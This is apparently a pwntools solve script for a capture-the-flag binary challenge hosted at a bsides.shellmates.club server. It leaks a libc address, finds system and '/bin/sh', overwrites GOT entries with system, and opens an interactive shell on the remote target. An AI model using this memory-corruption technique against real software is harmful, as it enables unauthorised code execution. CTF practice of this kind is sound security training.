from pwn import *

elf = ELF('./chall')
context.binary = elf
#p = elf.process() #gdb.debug(elf.path gdbscript='b *main+103')
libc = ELF('./libc.so.6')
p = remote(port=443, host='junior-pwner.bsides.shellmates.club', ssl=True)

messages = elf.symbols['messages']

padding = p64(0x404018) * 8
padding += p64(messages + 0x50)

p.sendline(padding)
p.recv()

padding = b'A'

p.sendline(padding)
#recv = p.recvline()#.split(b'\n')[0]
adr = int.from_bytes(p.recv(numb=6).strip(), 'little')

log.warn(f'---------- {hex(adr)}')

libc.address = adr - libc.symbols['puts']

log.warn('libc at : ' +  str(hex(libc.address)))

system = libc.symbols['system']

bin_sh = next(libc.search(b'/bin/sh\0'))

log.warn('system at : ' + str(hex(system)))

log.warn('bin/sh at : ' + str(hex(bin_sh)))

padding = p64(bin_sh) * 8
padding += p64(messages + 0x50)

p.sendline(padding)

p.recv()

log.warn('overwrote the messages with bin_sh at : ' + str(hex(messages)))

log.warn('rand at : ' + str(hex(libc.symbols['rand'])))

padding = b'A'
p.sendline(padding)
p.recv()

padding = p64(system) * 6
padding += p64(libc.symbols['malloc'])
padding += p64(libc.symbols['rand'])
padding += p64(0x404018 + 0x50)


p.sendline(padding)

p.recv()

log.warn('overwrote GOT with system')


p.interactive()

